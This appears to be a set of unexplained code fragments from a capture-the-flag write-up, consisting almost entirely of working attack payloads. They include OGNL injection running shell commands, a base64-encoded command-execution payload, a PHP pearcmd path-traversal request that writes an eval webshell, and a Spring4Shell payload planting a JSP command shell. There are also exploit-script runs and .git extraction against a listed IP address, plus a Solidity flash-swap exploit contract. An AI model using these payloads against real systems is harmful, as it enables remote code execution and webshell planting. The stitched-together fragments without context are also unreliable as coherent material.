${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("chmod +x index.html").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("bash index.html").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
${base64decoder:
JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==}
GET /?+config-create+/&lang=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[a]);?>+/tmp/1.php HTTP/1.1Host: localhost:
8888Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36Connection: closeCache-Control: max-age=0
py -3 .poc.py --debug one4all -u http://ip:
9090/ -c "/readflag"
$ python git_extract.py http://47.98.216.107:
31584/.git/
$ cat 47.98.216.107_31584/server.xml|grep appBase<Host name="XXXX" appBase="chaitin"
python exploit.py --url http://47.98.216.107:
31584/ --dir chaitin/ROOT
payload：class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=/tmp&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&class.module.classLoader.resources.context.parent.appBase=/
pragma solidity ^0.8.0;import "./Happy.sol";
contract Exploit { event tokenA_tokenB(address, address); IHappyFactory factory = IHappyFactory(address(0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36)); IHappyPair public pair; IHappyERC20 public tokenA; IHappyERC20 public tokenB; address public gamer;
 constructor(address tokenA_address, address tokenB_address) { gamer = msg.sender; tokenA = IHappyERC20(tokenA_address); tokenB = IHappyERC20(tokenB_address); pair = IHappyPair(factory.getPair(tokenA_address, tokenB_address)); }
 function attack(uint256 amount0, uint256 amount1) public { pair.swap(amount0, amount1, address(this), "0x"); tokenB.transfer(gamer, 1 ether); }
 fallback() external { pair.sync(); tokenA.transferFrom(gamer, address(pair), 1 ether); }}
from Crypto.Util.number import *from Crypto.Cipher import AESp = 193387944202565886198256260591909756041P.<x> = GF(p)[]f = x^3 + 2*x^2 + xP = (4, 10)Q = (65639504587209705872811542111125696405,125330437930804525313353306745824609665)f_ = f.subs(x=x-1)print f_.factor()
P_ = (P[0] +1, P[1])Q_ = (Q[0] +1, Q[1])
t = GF(p)(p-1).square_root()u = (P_[1] + t*P_[0])/(P_[1] - t*P_[0]) % pv = (Q_[1] + t*Q_[0])/(Q_[1] - t*Q_[0]) % pprint(v.log(u))k = v.log(u)aes = AES.new(long_to_bytes(k).ljust(16, ' '), AES.MODE_CBC, ' '*16)flag = "b3669dc657cef9dc17db4de5287cd1a1e8a48184ed9746f4c52d3b9f8186ec046d6fb1b8ed1b45111c35b546204b68e0".decode("hex")print(len(flag))plaintext = aes.decrypt(flag)print(plaintext)
function hook(){ Java.perform(function(){ var SecurityParams = Java.use("b.a.a.a"); SecurityParams.a.implementation = function(str){ var ret = this.a(str); console.log(ret); return ret; } }); }function main() { hook()}
setImmediate(main)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1673433104.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1673433105.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1673433106.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1673433106.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1673433107.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/4-1673433107.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1673433108.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1673433108.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1673433108.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1673433109.png)